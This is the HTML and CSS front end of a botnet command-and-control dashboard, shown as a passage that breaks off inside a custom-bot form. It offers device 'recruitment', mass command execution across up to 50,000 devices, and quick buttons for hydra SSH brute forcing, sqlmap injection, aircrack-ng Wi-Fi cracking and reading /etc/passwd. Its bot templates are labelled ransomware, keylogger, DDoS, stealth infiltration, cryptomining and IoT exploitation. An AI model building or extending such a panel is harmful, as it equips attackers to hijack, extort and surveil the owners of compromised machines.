        .system-stats {
            display: flex;
            gap: 1rem;
            font-size: 12px;
        }
        
        .stat-item {
            background: rgba(0, 255, 159, 0.1);
            padding: 0.5rem;
            border-radius: 4px;
            border: 1px solid #00ff9f;
        }
        
        .main-container {
            display: grid;
            grid-template-columns: 300px 1fr 400px;
            height: calc(100vh - 80px);
            gap: 1rem;
            padding: 1rem;
        }
        
        .panel {
            background: rgba(26, 26, 46, 0.8);
            border: 1px solid #00ff9f;
            border-radius: 8px;
            padding: 1rem;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 255, 159, 0.1);
        }
        
        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
            padding-bottom: 0.5rem;
            border-bottom: 1px solid #00ff9f;
        }
        
        .panel-title {
            color: #00ff9f;
            font-size: 16px;
            font-weight: bold;
            text-transform: uppercase;
        }
        
        .device-list {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .device-item {
            background: rgba(0, 255, 159, 0.05);
            border: 1px solid rgba(0, 255, 159, 0.3);
            border-radius: 4px;
            padding: 0.75rem;
            margin-bottom: 0.5rem;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
        }
        
        .device-item:hover {
            background: rgba(0, 255, 159, 0.1);
            border-color: #00ff9f;
            transform: translateX(5px);
        }
        
        .device-item.selected {
            background: rgba(0, 255, 159, 0.2);
            border-color: #00ff9f;
        }
        
        .device-status {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 0.5rem;
            animation: blink 2s infinite;
        }
        
        .device-status.online { background: #00ff9f; }
        .device-status.offline { background: #ff0080; animation: none; }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.3; }
        }
        
        .device-info {
            font-size: 12px;
            color: #a0a0a0;
            margin-top: 0.25rem;
        }
        
        .command-center {
            display: flex;
            flex-direction: column;
            height: 100%;
        }
        
        .command-tabs {
            display: flex;
            margin-bottom: 1rem;
        }
        
        .tab {
            padding: 0.5rem 1rem;
            background: rgba(0, 255, 159, 0.1);
            border: 1px solid #00ff9f;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .tab.active {
            background: #00ff9f;
            color: #0a0a0a;
        }
        
        .tab:first-child { border-radius: 4px 0 0 4px; }
        .tab:last-child { border-radius: 0 4px 4px 0; }
        .tab + .tab { border-left: none; }
        
        .command-input-area {
            display: flex;
            gap: 0.5rem;
            margin-bottom: 1rem;
        }
        
        .command-input {
            flex: 1;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ff9f;
            color: #00ff9f;
            padding: 0.75rem;
            border-radius: 4px;
            font-family: inherit;
            font-size: 14px;
        }
        
        .command-input:focus {
            outline: none;
            box-shadow: 0 0 10px rgba(0, 255, 159, 0.5);
        }
        
        .btn {
            background: linear-gradient(45deg, #00ff9f, #00cc7f);
            color: #0a0a0a;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            text-transform: uppercase;
            transition: all 0.3s ease;
            font-family: inherit;
        }
        
        .btn:hover {
            background: linear-gradient(45deg, #00cc7f, #00ff9f);
            box-shadow: 0 4px 15px rgba(0, 255, 159, 0.4);
            transform: translateY(-2px);
        }
        
        .btn-danger {
            background: linear-gradient(45deg, #ff0080, #cc0066);
            color: white;
        }
        
        .btn-secondary {
            background: linear-gradient(45deg, #0080ff, #0066cc);
            color: white;
        }
        
        .terminal {
            flex: 1;
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #00ff9f;
            border-radius: 4px;
            padding: 1rem;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.4;
            max-height: 500px;
        }
        
        .terminal-line {
            margin-bottom: 0.5rem;
            word-wrap: break-word;
        }
        
        .terminal-timestamp {
            color: #666;
            font-size: 11px;
        }
        
        .terminal-success { color: #00ff9f; }
        .terminal-error { color: #ff0080; }
        .terminal-warning { color: #ffaa00; }
        .terminal-info { color: #0080ff; }
        .terminal-command { color: #ffffff; font-weight: bold; }
        .terminal-output { color: #cccccc; font-family: 'Courier New', monospace; background: rgba(0,0,0,0.3); padding: 0.2rem; margin-left: 1rem; }
        
        .file-drop-zone {
            border: 2px dashed #00ff9f;
            border-radius: 8px;
            padding: 2rem;
            text-align: center;
            margin-bottom: 1rem;
            transition: all 0.3s ease;
            cursor: pointer;
        }
        
        .file-drop-zone:hover, .file-drop-zone.dragover {
            background: rgba(0, 255, 159, 0.1);
            border-color: #00cc7f;
        }
        
        .service-list {
            max-height: 300px;
            overflow-y: auto;
        }
        
        .service-item {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(0, 255, 159, 0.3);
            border-radius: 4px;
            padding: 0.5rem;
            margin-bottom: 0.5rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .service-controls {
            display: flex;
            gap: 0.25rem;
        }
        
        .quick-commands {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 0.5rem;
            margin-bottom: 1rem;
        }
        
        .quick-cmd {
            background: rgba(0, 255, 159, 0.1);
            border: 1px solid #00ff9f;
            color: #00ff9f;
            padding: 0.5rem;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 12px;
            text-align: center;
        }
        
        .quick-cmd:hover {
            background: rgba(0, 255, 159, 0.2);
            transform: scale(1.05);
        }
        
        .device-groups {
            margin-bottom: 1rem;
        }
        
        .group-tag {
            display: inline-block;
            background: rgba(0, 128, 255, 0.2);
            color: #0080ff;
            padding: 0.25rem 0.5rem;
            border-radius: 3px;
            font-size: 11px;
            margin: 0.125rem;
            border: 1px solid #0080ff;
        }
        
        .metrics-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 0.5rem;
            margin-bottom: 1rem;
        }
        
        .metric-item {
            background: rgba(0, 0, 0, 0.5);
            padding: 0.75rem;
            border-radius: 4px;
            border: 1px solid rgba(0, 255, 159, 0.3);
            text-align: center;
        }
        
        .metric-value {
            font-size: 18px;
            font-weight: bold;
            color: #00ff9f;
        }
        
        .metric-label {
            font-size: 11px;
            color: #666;
            text-transform: uppercase;
        }
        
        /* Mobile responsive */
        @media (max-width: 768px) {
            .main-container {
                grid-template-columns: 1fr;
                grid-template-rows: auto auto 1fr;
            }
            
            .header-content {
                flex-direction: column;
                gap: 1rem;
            }
            
            .system-stats {
                flex-wrap: wrap;
            }
        }
        
        .notification {
            position: fixed;
            top: 100px;
            right: 20px;
            background: rgba(0, 255, 159, 0.9);
            color: #0a0a0a;
            padding: 1rem;
            border-radius: 4px;
            box-shadow: 0 4px 20px rgba(0, 255, 159, 0.3);
            z-index: 1000;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .progress-bar {
            width: 100%;
            height: 4px;
            background: rgba(0, 255, 159, 0.2);
            border-radius: 2px;
            overflow: hidden;
            margin: 0.5rem 0;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff9f, #00cc7f);
            transition: width 0.3s ease;
        }
        
        /* Bot Management Styles */
        .panel-controls {
            display: flex;
            gap: 0.5rem;
        }
        
        .bot-management {
            margin-bottom: 1rem;
        }
        
        .bot-creation-section {
            background: rgba(0, 0, 0, 0.3);
            padding: 1rem;
            border-radius: 4px;
            margin-bottom: 1rem;
            border: 1px solid rgba(0, 255, 159, 0.3);
        }
        
        .bot-action-buttons {
            display: flex;
            gap: 0.5rem;
            margin-top: 0.5rem;
        }
        
        .bot-control-header {
            margin-bottom: 1.5rem;
        }
        
        .bot-overview-stats {
            display: flex;
            gap: 1rem;
            margin-top: 1rem;
        }
        
        .stat-card {
            background: rgba(0, 0, 0, 0.5);
            padding: 1rem;
            border-radius: 4px;
            border: 1px solid rgba(0, 255, 159, 0.3);
            text-align: center;
            flex: 1;
        }
        
        .stat-number {
            font-size: 24px;
            font-weight: bold;
            color: #00ff9f;
        }
        
        .stat-label {
            font-size: 11px;
            color: #666;
            text-transform: uppercase;
            margin-top: 0.5rem;
        }
        
        .bot-templates-section {
            margin-bottom: 1.5rem;
        }
        
        .bot-templates-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 0.75rem;
            margin-top: 0.75rem;
        }
        
        .bot-template-card {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(0, 255, 159, 0.3);
            border-radius: 4px;
            padding: 1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
        }
        
        .bot-template-card:hover {
            background: rgba(0, 255, 159, 0.1);
            border-color: #00ff9f;
            transform: translateY(-2px);
        }
        
        .template-icon {
            font-size: 24px;
            margin-bottom: 0.5rem;
        }
        
        .template-name {
            font-weight: bold;
            color: #00ff9f;
            margin-bottom: 0.25rem;
        }
        
        .template-desc {
            font-size: 11px;
            color: #666;
        }
        
        .bulk-bot-operations {
            margin-bottom: 1.5rem;
        }
        
        .bulk-controls {
            display: flex;
            gap: 0.5rem;
            margin-top: 0.75rem;
            flex-wrap: wrap;
        }
        
        .bulk-controls select {
            flex: 1;
            min-width: 150px;
        }
        
        .custom-command-area {
            margin-top: 0.75rem;
        }
        
        .bot-network-operations {
            margin-bottom: 1.5rem;
        }
        
        .network-operations-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 0.5rem;
            margin-top: 0.75rem;
        }
        
        .operation-btn {
            background: rgba(0, 128, 255, 0.1);
            border: 1px solid #0080ff;
            color: #0080ff;
            padding: 0.75rem;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.25rem;
        }
        
        .operation-btn:hover {
            background: rgba(0, 128, 255, 0.2);
            transform: scale(1.05);
        }
        
        .op-icon {
            font-size: 18px;
        }
        
        .op-label {
            font-size: 11px;
            font-weight: bold;
        }
        
        .bot-results-area {
            margin-bottom: 1rem;
        }
        
        .network-stats {
            margin-top: 1rem;
        }
        
        .group-tag.active {
            background: #00ff9f;
            color: #0a0a0a;
        }
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    
    <header>
        <div class="header-content">
            <div class="logo">🚀 UNIFIED CONTROL CENTER</div>
            <div class="system-stats">
                <div class="stat-item">
                    <div>DEVICES: <span id="deviceCount">0</span></div>
                </div>
                <div class="stat-item">
                    <div>ONLINE: <span id="onlineCount">0</span></div>
                </div>
                <div class="stat-item">
                    <div>LOAD: <span id="systemLoad">0%</span></div>
                </div>
                <div class="stat-item">
                    <div>UPTIME: <span id="uptime">00:00</span></div>
                </div>
            </div>
        </div>
    </header>
    
    <div class="main-container">
        <!-- Left Panel: Bot Network Management -->
        <div class="panel">
            <div class="panel-header">
                <div class="panel-title">🤖 BOT NETWORK FLEET</div>
                <div class="panel-controls">
                    <button class="btn btn-secondary" onclick="refreshDevices()">SYNC</button>
                    <button class="btn" onclick="showCreateBotModal()">CREATE BOT</button>
                </div>
            </div>
            
            <div class="bot-management">
                <div class="bot-creation-section">
                    <h4 style="color: #00ff9f; margin-bottom: 0.5rem;">⚡ Bot Network Control</h4>
                    <div class="bot-controls">
                        <select id="botTemplateSelect" class="command-input" style="margin-bottom: 0.5rem;">
                            <option value="mobile">📱 Mobile Termux Bot</option>
                            <option value="server">🖥️ Server Bot</option>
                            <option value="scanner">🔍 Network Scanner Bot</option>
                            <option value="monitor">📊 Monitor Bot</option>
                            <option value="proxy">🌐 Proxy Bot</option>
                        </select>
                        <div class="bot-action-buttons">
                            <button class="btn" onclick="deployBotTemplate()">DEPLOY BOT</button>
                            <button class="btn btn-danger" onclick="removeSelectedBots()">REMOVE BOTS</button>
                        </div>
                    </div>
                </div>
                
                <div class="device-groups">
                    <div class="group-tag active" onclick="filterByGroup('all')">ALL BOTS</div>
                    <div class="group-tag" onclick="filterByGroup('production')">PRODUCTION</div>
                    <div class="group-tag" onclick="filterByGroup('staging')">STAGING</div>
                    <div class="group-tag" onclick="filterByGroup('mobile')">MOBILE</div>
                    <div class="group-tag" onclick="filterByGroup('servers')">SERVERS</div>
                    <div class="group-tag" onclick="filterByGroup('scanners')">SCANNERS</div>
                </div>
            </div>
            
            <div class="device-list" id="deviceList">
                <!-- Bot devices will be populated here -->
            </div>
            
            <div class="network-stats">
                <div class="metrics-grid">
                    <div class="metric-item">
                        <div class="metric-value" id="totalBots">0</div>
                        <div class="metric-label">Total Bots</div>
                    </div>
                    <div class="metric-item">
                        <div class="metric-value" id="activeBots">0</div>
                        <div class="metric-label">Active</div>
                    </div>
                    <div class="metric-item">
                        <div class="metric-value" id="totalCommands">0</div>
                        <div class="metric-label">Commands</div>
                    </div>
                    <div class="metric-item">
                        <div class="metric-value" id="successRate">100%</div>
                        <div class="metric-label">Success</div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Center Panel: Command Center -->
        <div class="panel command-center">
            <div class="panel-header">
                <div class="panel-title">⚡ COMMAND CENTER</div>
                <div class="command-tabs">
                    <div class="tab active" onclick="switchTab('terminal')">TERMINAL</div>
                    <div class="tab" onclick="switchTab('device-terminal')">DEVICE TERMINAL</div>
                    <div class="tab" onclick="switchTab('bots')">BOT CONTROL</div>
                    <div class="tab" onclick="switchTab('files')">FILES</div>
                    <div class="tab" onclick="switchTab('services')">SERVICES</div>
                </div>
            </div>
            
            <div id="terminalTab" class="tab-content">
                <div class="terminal-mode-selector" style="margin-bottom: 1rem;">
                    <div style="display: flex; gap: 1rem; align-items: center;">
                        <label style="color: #00ff9f; font-size: 12px;">
                            <input type="checkbox" id="realTerminalMode" onchange="toggleRealTerminalMode()"> 
                            Real Terminal Mode (Direct Shell Access)
                        </label>
                        <button class="btn btn-secondary" onclick="showDeviceDiscovery()">🔍 DISCOVER DEVICES</button>
                        <button class="btn btn-secondary" onclick="showResourceOptimization()">⚙️ OPTIMIZE</button>
                    </div>
                </div>
                
                <div id="deviceDiscoveryPanel" style="display: none; margin-bottom: 1rem; background: rgba(0,0,0,0.5); padding: 1rem; border-radius: 4px; border: 1px solid #00ff9f;">
                    <h4 style="color: #00ff9f; margin-bottom: 0.5rem;">📡 Device Discovery & Recruitment</h4>
                    <div class="discovery-controls">
                        <button class="btn" onclick="scanLocalNetwork()">SCAN LOCAL NETWORK</button>
                        <button class="btn btn-secondary" onclick="refreshDiscoveryResults()">REFRESH RESULTS</button>
                    </div>
                    <div id="discoveredDevices" style="margin-top: 0.5rem;">
                        <!-- Discovered devices will appear here -->
                    </div>
                </div>
                
                <div id="resourceOptimizationPanel" style="display: none; margin-bottom: 1rem; background: rgba(0,0,0,0.5); padding: 1rem; border-radius: 4px; border: 1px solid #00ff9f;">
                    <h4 style="color: #00ff9f; margin-bottom: 0.5rem;">⚙️ Resource Optimization</h4>
                    <div class="optimization-controls">
                        <button class="btn" onclick="autoOptimizeResources()">AUTO OPTIMIZE</button>
                        <button class="btn btn-secondary" onclick="getOptimizationProfile()">VIEW PROFILE</button>
                    </div>
                    <div id="optimizationResults" style="margin-top: 0.5rem;">
                        <!-- Optimization results will appear here -->
                    </div>
                </div>
                
                <div class="quick-commands">
                    <div class="quick-cmd" onclick="sendQuickCommand('uname -a')">SYSTEM INFO</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('ps aux | head -20')">PROCESSES</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('df -h')">DISK USAGE</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('free -h')">MEMORY</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('uptime')">UPTIME</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('whoami')">USER</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('ip addr show')">NETWORK INFO</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('netstat -tuln')">OPEN PORTS</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('nmap -sn 192.168.1.0/24')">NETWORK SCAN</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('curl -s ipinfo.io')">PUBLIC IP</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('cat /etc/passwd | head -10')">USERS</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('crontab -l')">CRON JOBS</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('ls -la /tmp')">TEMP FILES</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('find / -name \"*.log\" 2>/dev/null | head -10')">LOG FILES</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('ss -tuln')">CONNECTIONS</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('lsof -i')">OPEN FILES</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('nmap -sV -sC target_ip')">VULN SCAN</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('hydra -l admin -P passwords.txt ssh://target_ip')">BRUTE FORCE</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('sqlmap -u \"http://target/page?id=1\"')">SQL INJECTION</div>
                    <div class="quick-cmd" onclick="sendQuickCommand('aircrack-ng -a2 -b target_mac -w wordlist.txt capture.cap')">WIFI CRACK</div>
                </div>
                
                <div class="command-input-area">
                    <select id="targetSelect" class="command-input">
                        <option value="all">🌐 ALL BOTS</option>
                        <option value="tag:mobile">📱 MOBILE BOTS</option>
                        <option value="tag:servers">🖥️ SERVER BOTS</option>
                        <option value="tag:scanners">🔍 SCANNER BOTS</option>
                        <option value="tag:stealth">👤 STEALTH BOTS</option>
                        <option value="tag:miners">⛏️ MINING BOTS</option>
                        <option value="tag:ddos">💥 DDOS BOTS</option>
                        <option value="tag:keyloggers">⌨️ KEYLOGGER BOTS</option>
                        <option value="tag:ransomware">🔒 RANSOMWARE BOTS</option>
                        <option value="tag:bruteforcers">🔨 BRUTE FORCE BOTS</option>
                        <option value="tag:vulnerability_scanners">🔐 VULN SCANNERS</option>
                        <option value="tag:device_discoverers">📡 DEVICE DISCOVERERS</option>
                    </select>
                    <input type="text" id="commandInput" class="command-input" 
                           placeholder="Enter any terminal command (ls, nmap, hydra, sqlmap, metasploit, etc.)" 
                           onkeypress="handleCommandKeyPress(event)">
                    <button class="btn" onclick="sendTerminalCommand()">EXECUTE</button>
                </div>
                
                <div class="terminal-controls" style="margin-bottom: 0.5rem;">
                    <button class="btn btn-secondary" onclick="clearTerminal()">CLEAR</button>
                    <button class="btn btn-secondary" onclick="exportTerminalLog()">EXPORT LOG</button>
                    <button class="btn btn-secondary" onclick="toggleTerminalAutoscroll()">AUTO-SCROLL</button>
                    <button class="btn btn-secondary" onclick="getTerminalHistory()">HISTORY</button>
                    <span style="color: #666; font-size: 11px; margin-left: 1rem;">
                        Connected Bots: <span id="connectedBotCount">0</span> | 
                        Active Operations: <span id="activeOperations">0</span>
                    </span>
                </div>
                
                <div class="terminal" id="terminal">
                    <div class="terminal-line terminal-success">
                        <span class="terminal-timestamp">[SYSTEM]</span> 
                        🚀 Advanced Bot Network Terminal - 50,000+ Device Support Ready
                    </div>
                    <div class="terminal-line terminal-info">
                        <span class="terminal-timestamp">[INFO]</span> 
                        📡 Real terminal mode enabled - Direct shell access across entire botnet
                    </div>
                    <div class="terminal-line terminal-info">
                        <span class="terminal-timestamp">[INFO]</span> 
                        🤖 Use target selection for coordinated operations across bot groups
                    </div>
                </div>
            </div>
            
            <div id="device-terminalTab" class="tab-content" style="display: none;">
                <div class="device-terminal-header">
                    <h3 style="color: #00ff9f; margin-bottom: 1rem;">🖥️ Direct Device Terminal Access</h3>
                    <div style="background: rgba(0,255,159,0.1); padding: 0.5rem; border-radius: 4px; margin-bottom: 1rem; border-left: 3px solid #00ff9f;">
                        <div style="font-size: 12px; color: #00ff9f;">
                            💡 <strong>Device Terminal Mode:</strong> Direct access to your local device's terminal with real-time interaction
                        </div>
                    </div>
                </div>
                
                <div class="device-terminal-controls" style="margin-bottom: 1rem;">
                    <div style="display: flex; gap: 1rem; align-items: center; margin-bottom: 0.5rem;">
                        <button class="btn" onclick="initializeDeviceTerminal()">🚀 CONNECT TO DEVICE</button>
                        <button class="btn btn-secondary" onclick="clearDeviceTerminal()">🧹 CLEAR</button>
                        <button class="btn btn-secondary" onclick="exportDeviceTerminal()">📄 EXPORT LOG</button>
                        <span style="color: #666; font-size: 11px;">
                            Status: <span id="deviceTerminalStatus" style="color: #ff0080;">Disconnected</span>
                        </span>
                    </div>
                    
                    <div class="terminal-info" style="font-size: 11px; color: #666;">
                        🔒 Secure local terminal access | 🎯 Direct command execution | ⚡ Real-time output
                    </div>
                </div>
                
                <div class="device-terminal-container" style="background: #000; border: 1px solid #00ff9f; border-radius: 4px; height: 400px; display: flex; flex-direction: column;">
                    <div class="device-terminal-header-bar" style="background: linear-gradient(90deg, #00ff9f, #0080ff); padding: 0.3rem 1rem; color: #000; font-weight: bold; font-size: 12px;">
                        🖥️ Device Terminal - Local System Access
                    </div>
                    
                    <div id="deviceTerminalOutput" class="device-terminal-output" style="flex: 1; padding: 1rem; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 12px; line-height: 1.4;">
                        <div style="color: #00ff9f;">
                            Welcome to Device Terminal Access<br>
                            ====================================<br><br>
                            Click "CONNECT TO DEVICE" to establish direct terminal connection.<br>
                            This provides real-time access to your local system terminal.<br><br>
                            <span style="color: #0080ff;">Features:</span><br>
                            • Real-time command execution<br>
                            • Interactive terminal session<br>
                            • Secure local access only<br>
                            • Full shell capabilities<br><br>
                            <span style="color: #ff0080;">Security Note:</span> This terminal has direct access to your local system.<br>
                        </div>
                    </div>
                    
                    <div class="device-terminal-input-area" style="border-top: 1px solid #333; padding: 0.5rem; display: flex; align-items: center;">
                        <span style="color: #00ff9f; margin-right: 0.5rem; font-family: 'Courier New', monospace;">$</span>
                        <input type="text" id="deviceTerminalInput" placeholder="Enter command..." 
                               style="flex: 1; background: transparent; border: none; color: #fff; font-family: 'Courier New', monospace; outline: none;"
                               onkeypress="handleDeviceTerminalKeyPress(event)"
                               disabled>
                        <button class="btn" style="margin-left: 0.5rem; padding: 0.3rem 0.8rem; font-size: 11px;" onclick="executeDeviceTerminalCommand()" disabled id="deviceTerminalExecuteBtn">
                            EXECUTE
                        </button>
                    </div>
                </div>
                
                <div class="device-terminal-features" style="margin-top: 1rem;">
                    <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem;">
                        <div class="feature-panel">
                            <h5 style="color: #0080ff; margin-bottom: 0.5rem;">🎯 Quick Commands</h5>
                            <div style="display: flex; flex-wrap: wrap; gap: 0.3rem;">
                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('pwd')">PWD</button>
                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('ls -la')">LS</button>
                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('whoami')">WHOAMI</button>
                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('uname -a')">SYSTEM</button>
                            </div>
                        </div>
                        
                        <div class="feature-panel">
                            <h5 style="color: #0080ff; margin-bottom: 0.5rem;">📊 System Info</h5>
                            <div style="display: flex; flex-wrap: wrap; gap: 0.3rem;">
                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('free -h')">MEMORY</button>
                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('df -h')">DISK</button>
                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('top -n 1 | head -20')">PROCESSES</button>
                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('netstat -tuln')">NETWORK</button>
                            </div>
                        </div>
                        
                        <div class="feature-panel">
                            <h5 style="color: #0080ff; margin-bottom: 0.5rem;">🔧 Terminal Tools</h5>
                            <div style="display: flex; flex-wrap: wrap; gap: 0.3rem;">
                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('history | tail -10')">HISTORY</button>
                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('env | head -10')">ENV</button>
                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('which python3')">PYTHON</button>
                                <button class="btn btn-secondary" style="font-size: 10px; padding: 0.2rem 0.5rem;" onclick="sendDeviceTerminalCommand('ps aux | grep python')">PYTHON PROCS</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div id="botsTab" class="tab-content" style="display: none;">
                <div class="bot-control-header">
                    <h3 style="color: #00ff9f; margin-bottom: 1rem;">🤖 Advanced Bot Network Control</h3>
                    <div class="bot-overview-stats">
                        <div class="stat-card">
                            <div class="stat-number" id="networkBotCount">0</div>
                            <div class="stat-label">Network Bots</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-number" id="onlineBotCount">0</div>
                            <div class="stat-label">Online</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-number" id="executingBotCount">0</div>
                            <div class="stat-label">Executing</div>
                        </div>
                    </div>
                </div>
                
                <div class="bot-templates-section">
                    <h4 style="color: #00ff9f; margin-bottom: 0.5rem;">⚡ Advanced Bot Templates & Deployment</h4>
                    <div class="bot-templates-grid" style="grid-template-columns: repeat(3, 1fr);">
                        <div class="bot-template-card" onclick="deployBotType('mobile')">
                            <div class="template-icon">📱</div>
                            <div class="template-name">Termux Mobile</div>
                            <div class="template-desc">Android with full Termux capabilities</div>
                        </div>
                        <div class="bot-template-card" onclick="deployBotType('server')">
                            <div class="template-icon">🖥️</div>
                            <div class="template-name">Server Bot</div>
                            <div class="template-desc">Linux server with admin tools</div>
                        </div>
                        <div class="bot-template-card" onclick="deployBotType('scanner')">
                            <div class="template-icon">🔍</div>
                            <div class="template-name">Network Scanner</div>
                            <div class="template-desc">Network reconnaissance & security</div>
                        </div>
                        <div class="bot-template-card" onclick="deployBotType('monitor')">
                            <div class="template-icon">📊</div>
                            <div class="template-name">Monitor Bot</div>
                            <div class="template-desc">System monitoring & metrics</div>
                        </div>
                        <div class="bot-template-card" onclick="deployBotType('proxy')">
                            <div class="template-icon">🌐</div>
                            <div class="template-name">Proxy Bot</div>
                            <div class="template-desc">Traffic routing & anonymization</div>
                        </div>
                        <div class="bot-template-card" onclick="deployBotType('stealth')">
                            <div class="template-icon">👤</div>
                            <div class="template-name">Stealth Bot</div>
                            <div class="template-desc">Covert operations & infiltration</div>
                        </div>
                        <div class="bot-template-card" onclick="deployBotType('miner')">
                            <div class="template-icon">⛏️</div>
                            <div class="template-name">Mining Bot</div>
                            <div class="template-desc">Cryptocurrency mining</div>
                        </div>
                        <div class="bot-template-card" onclick="deployBotType('ddos')">
                            <div class="template-icon">💥</div>
                            <div class="template-name">DDoS Bot</div>
                            <div class="template-desc">Stress testing & load generation</div>
                        </div>
                        <div class="bot-template-card" onclick="deployBotType('keylogger')">
                            <div class="template-icon">⌨️</div>
                            <div class="template-name">Keylogger Bot</div>
                            <div class="template-desc">Keystroke & data monitoring</div>
                        </div>
                        <div class="bot-template-card" onclick="deployBotType('ransomware')">
                            <div class="template-icon">🔒</div>
                            <div class="template-name">Ransomware Bot</div>
                            <div class="template-desc">File encryption operations</div>
                        </div>
                        <div class="bot-template-card" onclick="deployBotType('botnet_controller')">
                            <div class="template-icon">👑</div>
                            <div class="template-name">C2 Controller</div>
                            <div class="template-desc">Command & control master</div>
                        </div>
                        <div class="bot-template-card" onclick="deployBotType('web_crawler')">
                            <div class="template-icon">🕷️</div>
                            <div class="template-name">Web Crawler</div>
                            <div class="template-desc">Automated scraping & data collection</div>
                        </div>
                        <div class="bot-template-card" onclick="deployBotType('social_media')">
                            <div class="template-icon">📢</div>
                            <div class="template-name">Social Media Bot</div>
                            <div class="template-desc">Influence & automation operations</div>
                        </div>
                        <div class="bot-template-card" onclick="deployBotType('iot_bot')">
                            <div class="template-icon">🌐</div>
                            <div class="template-name">IoT Bot</div>
                            <div class="template-desc">IoT device control & exploitation</div>
                        </div>
                        <div class="bot-template-card" onclick="showCustomBotCreator()" style="border: 2px dashed #00ff9f;">
                            <div class="template-icon">🛠️</div>
                            <div class="template-name">Custom Bot</div>
                            <div class="template-desc">Create fully customized bot</div>
                        </div>
                    </div>
                    
                    <div id="customBotCreator" style="display: none; margin-top: 1rem; background: rgba(0,0,0,0.5); padding: 1rem; border-radius: 4px; border: 1px solid #00ff9f;">
                        <h4 style="color: #00ff9f; margin-bottom: 0.5rem;">🛠️ Custom Bot Creator</h4>
                        <div class="custom-bot-form">
                            <input type="text" id="customBotName" class="command-input" placeholder="Bot Name" style="margin-bottom: 0.5rem;">
                            <input type="text" id="customBotIcon" class="command-input" placeholder="Bot Icon (emoji)" style="margin-bottom: 0.5rem;">
                            <textarea id="customBotDesc" class="command-input" placeholder="Bot Description" style="margin-bottom: 0.5rem; resize: vertical; height: 60px;"></textarea>
                            <input type="text" id="customBotTags" class="command-input" placeholder="Tags (comma separated)" style="margin-bottom: 0.5rem;">
                            <textarea id="customBotCapabilities" class="command-input" placeholder="Capabilities (comma separated)" style="margin-bottom: 0.5rem; resize: vertical; height: 60px;"></textarea>
                            <textarea id="customBotScript" class="command-input" placeholder="Custom deployment script (optional)" style="margin-bottom: 0.5rem; resize: vertical; height: 80px;"></textarea>
                            <div class="bot-action-buttons">
                                <button class="btn" onclick="createCustomBot()">CREATE CUSTOM BOT</button>
